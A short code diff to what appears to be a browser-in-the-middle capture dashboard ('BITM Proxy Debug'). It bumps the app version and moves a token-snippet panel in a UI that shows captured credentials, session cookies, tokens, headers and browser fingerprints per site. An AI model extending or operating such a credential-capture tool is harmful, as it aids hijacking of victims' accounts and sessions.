@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.28.4")
+app = FastAPI(title="BITM Proxy Debug", version="1.28.5")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -7343,6 +7343,7 @@ function renderCreds(){
           <input id="test-url-${site.id}" class="cfg-input" style="flex:1;min-width:180px;font-size:13px" placeholder="Custom test URL (optional)" value="">
         </div>
         <div id="test-result-${site.id}" style="margin-top:6px;margin-bottom:8px;display:none"></div>
+        ${renderAaaTokenSnippet(d,site.id)}
         ${tc?renderTokens(d.tokens,site.id):''}
         ${renderCapturedHeaders(d,site.id)}
         ${cc?`<div style="margin-bottom:8px"><div style="color:#fbbf24;font-weight:bold;margin-bottom:4px">Cookies (${cc})</div><div style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:200px">${(d.cookies||[]).map(c=>`<div><span style="color:#60a5fa">${esc(c.name)}</span> <span style="color:#8893a7">${esc((c.value||'').slice(0,80))}</span></div>`).join('')}</div></div>`:''}
@@ -7352,7 +7353,6 @@ function renderCreds(){
         ${d.external_capture_metadata?`<div style="margin-bottom:8px"><div style="color:#a78bfa;font-weight:bold;margin-bottom:4px">Fingerprint & Metadata</div><div style="display:flex;gap:4px;margin-bottom:6px"><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-summary-${site.id}').style.display='';document.getElementById('fp-json-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-json=${site.id}]').style.background='#2d1b4e';" data-fp-summary="${site.id}">Summary</button><button class="btn" style="padding:2px 8px;font-size:12px;background:#2d1b4e;border:1px solid #6b21a8;color:#d8b4fe" onclick="document.getElementById('fp-json-${site.id}').style.display='';document.getElementById('fp-summary-${site.id}').style.display='none';event.target.style.background='#6b21a8';document.querySelector('[data-fp-summary=${site.id}]').style.background='#2d1b4e';" data-fp-json="${site.id}">JSON</button></div><div id="fp-summary-${site.id}" style="background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;line-height:1.6">${renderFingerprintSummary(d.external_capture_metadata)}</div><div id="fp-json-${site.id}" style="display:none;background:#0a0a14;padding:8px;border-radius:4px;overflow:auto;max-height:300px;color:#cbd5e1;font-size:12px"><pre style="margin:0">${esc(JSON.stringify(d.external_capture_metadata,null,2))}</pre></div></div>`:''}
         ${d.current_url?`<div style="margin-top:8px;color:#78859b">URL: ${esc(d.current_url)}</div>`:''}
         ${d.captured_at?`<div style="color:#78859b">Captured: ${new Date(d.captured_at*1000).toLocaleString()}</div>`:''}
-        ${renderAaaTokenSnippet(d,site.id)}
         ${renderRopcPanel(d,site.id)}
         ${renderAdoPatPanel(d,site.id)}
         <div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
